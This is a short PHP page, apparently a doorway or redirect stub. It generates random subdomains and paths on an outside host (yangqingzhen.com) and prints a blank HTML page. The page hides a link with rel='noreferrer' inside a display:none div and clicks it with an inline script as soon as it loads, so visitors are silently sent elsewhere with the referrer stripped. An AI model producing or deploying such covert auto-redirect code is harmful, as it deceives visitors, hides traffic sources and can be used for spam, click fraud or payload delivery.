<?php
/**
 * Created by PhpStorm.
 * User: huanglintian
 * Date: 2018/11/3
 * Time: 11:13
 */
function str_rand($length = 32, $char = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') {
    if(!is_int($length) || $length < 0) {
        return false;
    }

    $string = '';
    for($i = $length; $i > 0; $i--) {
        $string .= $char[mt_rand(0, strlen($char) - 1)];
    }

    return $string;
}
$abc  =  str_rand(8);
$bbb = str_rand(5);
?>
<head>
    <meta charset="">
    <meta name="viewport" content="width=device-width">
    <title></title>
    <meta name="keywords" content="">
    <meta name="description" content="">
</head><body><div style="display: none;"><a href='http://<?php echo $abc;?>.yangqingzhen.com/hisehHWmrLCod62EeHrcgaamlX93ddquiLJqh<?php echo $bbb;?>.jpg?v=nOPHv8BWaB' rel='noreferrer' id='tmiJdfoOuQ' style='display: none;'>noreferer</a><script>document.getElementById('tmiJdfoOuQ').click();</script></div>
